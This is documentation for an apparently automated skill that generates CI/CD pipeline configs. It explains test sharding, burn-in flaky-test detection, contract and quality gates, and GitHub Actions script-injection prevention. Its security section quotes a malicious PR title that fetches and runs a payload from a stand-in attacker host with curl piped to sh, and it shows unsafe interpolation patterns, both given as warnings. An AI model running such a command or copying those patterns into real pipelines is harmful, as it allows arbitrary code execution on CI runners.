§ WHAT CI/CD Pipeline Setup — What does this Skill do?

Every time a developer pushes code, someone needs to run tests and report back. Without CI, that someone is you — manually. CI (Continuous Integration) automates that job: the moment code is pushed, a server wakes up, runs all tests, and reports pass or fail — no human intervention needed.

Developer pushes code
        ↓
CI server picks it up automatically
        ↓
lint → test → burn-in → report
        ↓                  ↓
   PASS → merge allowed   FAIL → blocked + notification sent

This skill generates the CI configuration file that defines that entire flow — what runs, when, how fast, and what happens on failure. The output is one file (e.g. .github/workflows/test.yml) that you commit and push. From that point forward, every PR is tested automatically.

§ WHY Why CI/CD Pipeline Setup?

Tests that only run locally give false confidence. Without CI, a developer merges code that "worked on my machine" — and breaks production. CI is the enforcement layer that makes test results mean something.

Without CI, quality depends on individuals remembering to run tests. With CI, quality is enforced structurally — code cannot be merged unless tests pass. Here is the full comparison:

Problem Without CI Pipeline With CI Pipeline (this skill)
Test reliability Tests pass locally, fail in CI due to environment differences — wrong Node version, browser not installed, missing dependency Pinned language versions, identical runner environment every run. scripts/ci-local.sh lets you mirror CI on your machine
Flaky tests Flaky tests pass most of the time, fail randomly — blame falls on "environment" and the team lives with it Burn-in loop runs tests 10× on every PR — flaky tests surface and block merge before they reach main
Test speed Single sequential run: 200 tests = 30–60 minutes. Developers wait, skip tests, or push without testing Parallel sharding across 4 runners: 200 tests in under 10 min/shard, full pipeline under 45 minutes
Security Ad-hoc CI scripts; PR titles and issue bodies can inject shell commands via ${{ github.event.* }} All user-controlled inputs routed through env: intermediaries — no direct expression injection allowed
API contract breaks Frontend and backend tested independently — a breaking API change is discovered after deploy can-i-deploy gate blocks deployment automatically if consumer/provider contracts are incompatible
Debugging failures Pipeline fails with no evidence — reproduce locally blind, add print statements, push again Artifacts uploaded on failure: HTML report, traces, videos, JUnit XML — debug from CI without touching code
Release evidence "Tests passed" in a Slack message — no audit trail, no structured gate output Quality gates enforced: P0 = 100%, P1 ≥ 95%. Structured pass/fail output per PR, ready for audit

steps-c Create Mode — 4 Steps primary

step-01 · Preflight Checks

Before generating anything, the skill verifies the project is actually ready. If any check fails, it stops immediately and tells you what to fix.

  • Filesteps-c/step-01-preflight.md
  • Git checkVerifies .git/ exists. CI requires git — HALT if missing.
  • Stack detectScans the project for frontend clues (playwright.config.*, next.config.*, src/components/) and backend clues (pyproject.toml, pom.xml, go.mod, Dockerfile). Both present → fullstack. Result determines which test commands and which pipeline template to use.
  • Framework checkVerifies a test framework config exists for the detected stack. HALT if missing — "Run framework workflow first."
  • Local test runActually runs your tests: npm test, pytest, go test ./..., etc. HALT if any test fails — CI should run green tests, not broken ones.
  • CI detectFinds which CI platform to target (see platform detection above).
  • Env contextReads your language version file (.nvmrc, .python-version, go.mod) so the generated CI config pins the exact same version you use locally.
  • OutputSaves detected stack type, platform, and env context to ci-pipeline-progress.md — used by Resume mode if interrupted.

step-02 · Generate the CI Pipeline

This is the main step — it produces the actual CI config file with all stages wired up. The skill picks the right platform template, fills it in based on your stack, and writes it to the correct path.

  • Filesteps-c/step-02-generate-pipeline.md
  • Template selectionEach platform has a pre-built template. The skill fills it in based on your test_stack_type and test_framework. Circle CI has no template — generated from first principles.
  • Stages generatedlint → test (parallel shards) → contract-test (if Pact is enabled) → burn-in → report
  • Stack-conditionalFrontend/Fullstack: includes browser install step. Backend: skips browser install, uses language-specific commands (pytest, go test, etc.).
  • Security baked inAll user-controlled CI inputs are automatically routed through env: intermediaries — the generated YAML cannot be exploited via PR title injection.
  • Dependency cachingEach language has its own cache strategy so CI does not re-download packages on every run (saves 2–5 min per run).

step-03 · Configure Quality Gates & Notifications

Quality gates define the rules that block a merge or deployment automatically — no human needs to decide. This step sets the thresholds and wires up failure alerts.

  • Filesteps-c/step-03-configure-quality-gates.md
  • Burn-in configFrontend/Fullstack: burn-in enabled by default (UI tests are prone to flakiness). Backend: skipped by default (unit/API tests are deterministic). Can be overridden explicitly.
  • Pass rate gatesP0 = 100% (any P0 failure blocks everything). P1 ≥ 95% (up to ~1–2 failures acceptable with a documented plan).
  • Contract gateIf Pact is enabled: the can-i-deploy check must pass before any staging or production deployment. A failing contract = deployment blocked.
  • NotificationsCI failure → automatic alert to Slack channel or email, with a direct link to the artifact (HTML report, video, trace) so QA can debug immediately.

step-04 · Validate & Summarize

Before declaring the setup complete, the skill validates its own output against the checklist and fixes any gaps. It then produces a completion report telling you exactly what was created and what to do next.

  • Filesteps-c/step-04-validate-and-summary.md
  • Self-validatesChecks: config file at correct path · stages and sharding configured · burn-in and artifacts enabled · required secrets documented. Applies corrections before marking complete.
  • Completion reportStates: CI platform used · config file path · key stages enabled · artifacts and notifications set up · next steps (set secrets, push, open first PR).

pipeline-stages Pipeline Stages — Explained

Every generated pipeline runs these stages in order. Each stage has a distinct responsibility so failures are immediately attributable.

lint  →  test (4 shards in parallel)  →  contract-test*  →  burn-in*  →  report
 <2min        <10min each                    optional           optional      always

Stage 1 — lint

Checks code style, formatting, and obvious mistakes before any test runs. If lint fails, the pipeline stops immediately — no point running 200 tests if a typo in a config file would have caused them all to fail anyway. Typically finishes in under 2 minutes.

Stage 2 — test (Parallel Sharding)

Instead of running 200 tests one-by-one (which takes 30–60 min), sharding splits them across multiple runners that work simultaneously:

Shard 1: tests 001–050  ──┐
Shard 2: tests 051–100  ──┤→ all run at the same time → done in ~8 min
Shard 3: tests 101–150  ──┤
Shard 4: tests 151–200  ──┘
  • Default shards4. Increase to 6 or 8 if a shard exceeds 10 minutes.
  • fail-fast: falseAll shards complete even if one fails — you see every failure at once, not just the first one.
  • Per-shard artifactsEach shard uploads its own named artifact (e.g. test-results-shard-2-of-4) so you can debug the exact failing shard.
  • Stack-awareFrontend/Fullstack: Playwright with --shard=1/4. Backend: pytest-xdist -n auto, JUnit parallel forks, Go -parallel, etc.

Stage 3 — contract-test (Optional)

Only runs when tea_use_pactjs_utils: true in config. This stage enforces API contracts between services — it verifies that the frontend and backend still "agree" on the API format before allowing a deploy. See Contract Testing in the §WHAT section for the full concept explanation.

  • Consumer gateRuns the consumer contract tests N times (default 3). Fails if the generated pact JSON is not identical across runs (determinism gate) — ensures the contract is stable before publishing it.
  • Publish pactsPushes the verified contract to Pact Broker. Only on PR and main branch pushes.
  • Provider verifyBackend runs against the published contracts — confirms its API still satisfies what the frontend expects.
  • Can-I-DeployThe final gate: can-i-deploy checks the broker and blocks deployment if any consumer/provider pair is incompatible. Required secrets: PACT_BROKER_BASE_URL, PACT_BROKER_TOKEN.

Stage 4 — burn-in (Flaky Test Detection)

A flaky test is one that sometimes passes and sometimes fails for no clear reason — usually caused by timing issues, race conditions, or selector instability in UI tests. Burn-in catches them by running the same tests multiple times:

Run test A — iteration 1: PASS
Run test A — iteration 2: PASS
Run test A — iteration 3: FAIL  ← flaky! Blocks merge.
  • Frontend / FullstackEnabled by default — UI tests are the primary source of flakiness (timing races, CSS transitions, dynamic selectors).
  • Backend onlySkipped by default — unit and API tests are deterministic. Can be enabled on request.
  • Iterations10 by default. Exits immediately on the first failure (|| exit 1) — no need to run all 10 if iteration 3 already failed.
  • Local mirrorscripts/burn-in.sh lets you run the same loop before pushing — catch flakiness on your machine before CI does.

Stage 5 — report

Aggregates results from all shards and publishes a single summary. Artifacts are uploaded only on failure — no noise on green runs, but everything you need when something breaks:

  • Frontend artifactsHTML report (visual) · JUnit XML (machine-readable) · Playwright traces · videos of failing tests · screenshots
  • Backend artifactsJUnit XML · coverage reports · language-specific outputs
  • Retention30 days. Adjust based on how long your team needs to investigate failures.
  • No sensitive dataThe checklist verifies no credentials or PII are captured in artifacts before enabling.

quality-gates Quality Gates — Automatic Blockers

A quality gate is an automatic rule that blocks a merge or deployment if a threshold is not met. No human needs to review and decide — the gate enforces the rule every time, consistently.

  • P0 gatePass rate must be 100%. Any single P0 failure = CI fails, deployment blocked. No exceptions.
  • P1 gatePass rate must be ≥ 95%. Up to ~1–2 failures acceptable, but they must have a documented remediation plan.
  • Burn-in gateIf burn-in stability check fails → promotion blocked. A burn-in failure means the test is flaky — it must be fixed before merging.
  • Contract gateIf Pact is enabled: can-i-deploy must pass before any staging or production deployment. A contract failure = deploy blocked.
  • Retry logicTransient failures (network timeout, env flakiness) get up to 2–3 automatic retries with a 30-min timeout. Deterministic failures (actual bugs) are never retried — they must be fixed.
  • Optional NFR gateRequire bmad-testarch-nfr assessment output before the release gate if configured — enforces that NFR evidence exists before shipping.

security Script Injection Prevention critical

CI pipelines can be exploited if user-controlled values (PR titles, issue bodies, workflow inputs) are placed directly into shell commands. A malicious PR title like "; curl evil.com/payload | sh" could execute arbitrary code on the CI runner.

All pipelines generated by this skill follow two strict rules:

Rule 1 — Never interpolate user-controlled values directly

Treat ${{ inputs.* }} and ${{ github.event.* }} (PR title, issue body, comment) as unsafe. Always pass them through an env: variable first, then reference the variable as "$ENV_VAR" in shell commands.

Rule 2 — Inputs must be DATA, never COMMANDS

Never accept an input like inputs.install-command that gets executed as a shell command. Even through env:, running $CMD where CMD comes from user input is still injection. Use fixed commands and pass inputs only as data arguments.

Safe vs Unsafe — At a Glance step-02 security section
PatternStatusWhy
env: TEST_GREP: ${{ inputs.test-grep }}
then run: npx playwright test --grep "$TEST_GREP"		 SAFE Input is passed through env: as a data argument to a fixed command
run: npx playwright test --grep "${{ inputs.test-grep }}" NEVER User input injected directly into a shell run: block
env: CMD: ${{ inputs.install-command }}
then run: $CMD		 NEVER Executing a user-controlled env var as a shell command — still injection
Contexts that are always safe (no env: intermediary needed)

${{ steps.*.outputs.* }} · ${{ matrix.* }} · ${{ runner.os }} · ${{ github.sha }} · ${{ github.ref }} · ${{ secrets.* }} · ${{ env.* }}
